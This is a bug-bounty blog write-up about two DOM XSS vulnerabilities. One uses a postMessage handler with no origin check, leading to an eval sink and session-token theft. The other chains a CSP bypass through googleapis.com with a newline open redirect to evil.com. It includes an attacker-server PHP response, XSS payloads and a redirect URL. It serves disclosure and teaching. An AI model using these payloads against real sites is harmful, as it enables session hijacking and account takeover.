---
source: spaceraccoon
source_url: https://spaceraccoon.dev/solving-dom-xss-puzzles/
title: "Solving DOM XSS Puzzles | Spaceraccoon's Blog"
published: 2022-02-03T00:05:45+00:00
description: "DOM-based Cross-site scripting (XSS) vulnerabilities rank as one of my favourite vulnerabilities to exploit. It’s a bit like solving a puzzle; sometimes you get a corner piece like $.html(), other times you have to rely on trial-and-error. I recently encountered two interesting postMessage DOM XSS vulnerabilities in bug bounty programs that scratched my puzzle-solving itch."
---

[Get my new book with No Starch Press "From Day Zero to Zero Day: A Hands-On Guide to Vulnerability Research" here! 🚀](https://nostarch.com/zero-day)

# Solving DOM XSS Puzzles

Feb 3, 2022
·

1240 words

·

6 minute read


DOM-based Cross-site scripting (XSS) vulnerabilities rank as one of my favourite vulnerabilities to exploit. It’s a bit like solving a puzzle; sometimes you get a corner piece like `$.html()`, other times you have to rely on trial-and-error. I recently encountered two interesting `postMessage` DOM XSS vulnerabilities in bug bounty programs that scratched my puzzle-solving itch.

Note: Some details have been anonymized.

# Puzzle A: The Postman Problem [🔗](https://spaceraccoon.dev/solving-dom-xss-puzzles/\#puzzle-a-the-postman-problem)

`postMessage` emerged in recent years as a common source of XSS bugs. As developers moved to client-side JavaScript frameworks, classic server-side rendered XSS vulnerabilities disappeared. Instead, frontends used asynchronous communication streams such as `postMessage` and WebSockets to dynamically modify content.

I keep an eye out for `postMessage` calls with Frans Rosén’s [`postmessage-tracker`](https://github.com/fransr/postMessage-tracker) tool. It’s a Chrome extension that helpfully alerts you whenever it detects a `postMessage` call and enumerates the path from source to sink. However, while `postMessage` calls abound, most tend to be false positives and require manual validation.

While browsing Company A’s website at [https://feedback.companyA.com/](https://feedback.companya.com/), `postmessage-tracker` notified me of a particularly interesting call originating from an iFrame [https://abc.cloudfront.net/iframe\_chat.html](https://abc.cloudfront.net/iframe_chat.html):

```javascript
window.addEventListener("message", function(e) {
// ...
    } else if (e.data.type =='ChatSettings') {
         if (e.data.iframeChatSettings) {
             window.settingsSync =  e.data.iframeChatSettings;
// ...
```

The `postMessage` handler checked if the message data (`e.data`) contained a `type` value matching `ChatSettings`. If so, it set `window.settingsSync` to `e.data.iframeChatSettings`. It did not perform any origin checks - always a good sign for bug hunters since the message could be sent from any attacker-controled domain.

What was `window.settingsSync` used for? By searching for this string in Burp, I discovered [https://abc.cloudfront.net/third-party.js](https://abc.cloudfront.net/third-party.js):

```javascript
else if(window.settingsSync.environment == "production"){
  var region = window.settingsSync.region;
  var subdomain = region.split("_")[1]+'-'+region.split("_")[0]
  domain = 'https://'+subdomain+'.settingsSync.com'
}
var url = domain+'/public/ext_data'

request.open('POST', url, true);
request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
request.onload = function () {
  if (request.status == 200) {
    var data = JSON.parse(this.response);
...
    window.settingsSync = data;
...
    var newScript = 'https://abc.cloudfront.net/module-v'+window.settingsSync.versionNumber+'.js';
    loadScript(document, newScript);
```

If `window.settingsSync.environment == "production"`, `window.settingsSync.region` would be rearranged into `subdomain` and inserted into `domain = 'https://'+subdomain+'.settingsSync.com`. This URL would then be used in a POST request. The response would be parsed as a JSON and set `window.settingsSync`. Next, `window.settingsSync.versionNumber` was used to construct a URL that loaded a new JavaScript file `var newScript = 'https://abc.cloudfront.net/module-v'+window.settingsSync.versionNumber+'.js'`.

In a typical scenario, the page would load [https://abc.cloudfront.net/module-v2.js](https://abc.cloudfront.net/module-v2.js):

```javascript
config = window.settingsSync.config;
// ...
eval("window.settingsSync.configs."+config)
```

Aha! `eval` was a simple sink that executed its string argument as JavaScript. If I controlled `config`, I could execute arbitrary JavaScript!

However, how could I manipulate `domain` to match my malicious server instead of `*.settingsSync.com`? I inspected the code again:

```javascript
  var region = window.settingsSync.region;
  var subdomain = region.split("_")[1]+'-'+region.split("_")[0]
  domain = 'https://'+subdomain+'.settingsSync.com'
```

I noticed that due to insufficient sanitisation and simple concatenation, a `window.settingsSync.region` value like `.my.website/malicious.php?_bad` would be rearranged into `https://bad-.my.website/malicious.php?.settingsSync.com`! Now `domain` pointed to `bad-.my.website`, a valid attacker-controlled domain served a malicious payload to the POST request.

![Diagram 1](https://spaceraccoon.dev/images/20/diagram_1.png)

I created `malicious.php` on my server to send a valid response by capturing the responses from the origin target. I modified the name of the selected `config` to my XSS payload:

```php
<?php
$origin = $_SERVER['HTTP_ORIGIN'];
header('Access-Control-Allow-Origin: ' . $origin);
header('Access-Control-Allow-Headers: cache-control');
header("Content-Type: application/json; charset=UTF-8");

echo '{
    "versionNumber": "2",
    "config": "a;alert()//",
    "configs": {
        "a": "a"
    }
    ...
}'
?>
```

Based on this response, the sink would now execute:

```javascript
eval("window.settingsSync.configs.a;alert()//")
```

From my own domain, I spawned the page containing the vulnerable iFrame with `var child = window.open("https://feedback.companyA.com/")`, then sent the PostMessage payload with `child.frames[1].postMessage(...)`. With that, the alert box popped!

However, I still needed one final piece. Since the XSS executed in the context of an iFrame [https://abc.cloudfront.net/iframe\_chat.html](https://abc.cloudfront.net/iframe_chat.html) instead of [https://feedback.companyA.com/](https://feedback.companya.com/), there was no actual impact; it was as good as executing XSS on an external domain. I needed to somehow leverage this XSS in the iFrame to reach the parent window [https://feedback.companyA.com/](https://feedback.companya.com/).

Thankfully, [https://feedback.companyA.com/](https://feedback.companya.com/) included yet another interesting `postMessage` handler:

```javascript
    }, d = document.getElementById("iframeChat"), window.addEventListener("message", function(m) {
        var e;
        "https://abc.cloudfront.net" === m.origin && ("IframeLoaded" == m.data.type && d.contentWindow.postMessage({
            type: "credentialConfig",
            credentialConfig: credentialConfig
        }, "*"))
```

[https://feedback.companyA.com/](https://feedback.companya.com/) created a `PostMessage` listener that validated the message origin as [https://abc.cloudfront.net](https://abc.cloudfront.net/). If the message data type was `IframeLoaded`, it sent a PostMessage back with `credentialConfig` data.

`credentialConfig` included a session token:

```json
{
    "region": "en-uk",
    "environment": "production",
    "userId": "<USERID>",
    "sessionToken": "Bearer <SESSIONTOKEN>"
}
```

Thus, by sending the PostMessage to trigger an XSS on [https://abc.cloudfront.net/iframe\_chat.html](https://abc.cloudfront.net/iframe_chat.html), the XSS would then run arbitrary JavaScript that sent another PostMessage from [https://abc.cloudfront.net/iframe\_chat.html](https://abc.cloudfront.net/iframe_chat.html) to [https://feedback.companyA.com/](https://feedback.companya.com/) which would leak the session token.

Based on this, I modified the XSS payload:

```json
{
    "versionNumber": "2",
    "config": "a;window.addEventListener(`message`, (event) => {alert(JSON.stringify(event.data))});parent.postMessage({type:`IframeLoaded`},`*`)//",
    "configs": {
        "a": "a
    }
}
```

The XSS received the session data from the parent iFrame on [https://feedback.companyA.com/](https://feedback.companya.com/) and exfiltrated the stolen `sessionToken` to an attacker-controlled server (I simply used `alert` here).

# Puzzle B: Bypassing CSP with Newline Open Redirect [🔗](https://spaceraccoon.dev/solving-dom-xss-puzzles/\#puzzle-b-bypassing-csp-with-newline-open-redirect)

While exploring the OAuth flow of Company B, I noticed something strange about its OAuth authorization page. Typically, OAuth authorization pages present some kind of confirmation button to link an account. For example, here’s Twitter’s OAuth authorization page to login to GitLab:

![OAuth Login](https://spaceraccoon.dev/images/20/oauth_login.png)

Company B’s page used a URL with the following format: `https://accept.companyb/confirmation?domain=oauth.companyb.com&state=<STATE>&client=<CLIENT ID>`. Once the page was loaded, it would dynamically send a GET request to `oauth.companyb.com/oauth_data?clientID=<CLIENT ID>`. This returned some data to populate the page’s contents:

```json
{
    "app": {
        "logoUrl": <PAGE LOGO URL>,
        "name": <NAME>,
        "link": <URL> ,
        "introduction": "A cool app!"
    }
}
```

By playing around with this response data, I realised that `introduction` was injected into the page without any sanitisation. If I could control the destination of the GET request and subsequently the response, it would be possible to cause an XSS.

Fortunately, it appeared that the `domain` parameter allowed me to control the domain of the GET request. However, when I set this to my own domain, the request failed to execute and raised a Content Security Policy (CSP) error. I quickly checked the CSP of the page:

```http
Content-Security-Policy: default-src 'self' 'unsafe-inline' *.companyb.com *.googleapis.com; script-src 'self' https: *.companyb.com; object-src 'none';
```

When dynamic HTTP requests are made, they adhere to the `connect-src` CSP rule. In this case, the `default-src` rule meant that only requests to `*.companyb.com` and `*.googleapis.com` were allowed. Unfortunately for the company, `*.googleapis.com` created a big loophole: since Google Cloud Storage files are hosted on `storage.googleapis.com`, I could still send requests to my attacker-controlled bucket! Furthermore, CORS would not be an issue as Google Cloud allows users to set the CORS policies of buckets.

I quickly hosted a JSON file with `text` as `<script>alert()</script>` on [https://storage.googleapis.com/myevilbucket/oauth\_data.json](https://storage.googleapis.com/myevilbucket/oauth_data.json), then browsed to `https://accept.companyb/confirmation?domain=storage.googleapis.com/myevilbucket/oauth_data.json%3F&state=<STATE>&client=<CLIENT ID>`. The page successfully requested my file at `https://storage.googleapis.com/myevilbucket/oauth_data.json?clientID=<CLIENT ID>`, then… nothing.

One more problem remained: the CSP for `script-src` only allowed for `self` or `*.companyb.com` for HTTPS. Luckily, I had an open redirect on `t.companyb.com` saved for such situations. The vulnerable endpoint would redirect to the value of the `url` parameter but validate if the parameter ended in `companyb.com`. However, it allowed a newline character `%0A` in the subdomain section, which would be truncated by browsers such that `http://t.companyb.com/redirect?url=http%3A%2F%2Fevil.com%0A.companyb.com%2F` actually redirected to [https://evil.com/%0A.companyb.com/](https://evil.com/%0A.companyb.com/) instead.

By using this bypass to create an open redirect, I saved my final XSS payload in `<NEWLINE CHARACTER>.companyb.com` in my web server’s document root. I then injected a script tag with `src` pointing to the open redirect which passed the CSP but eventually redirected to the final payload.

# Conclusion [🔗](https://spaceraccoon.dev/solving-dom-xss-puzzles/\#conclusion)

Both companies awarded bonuses for my XSS reports due to their complexity and ability to bypass hardened execution environments. I hope that by documenting my thought processes, you can also gain a few extra tips to solve DOM XSS puzzles.

[web](https://spaceraccoon.dev/tags/web) [code review](https://spaceraccoon.dev/tags/code-review)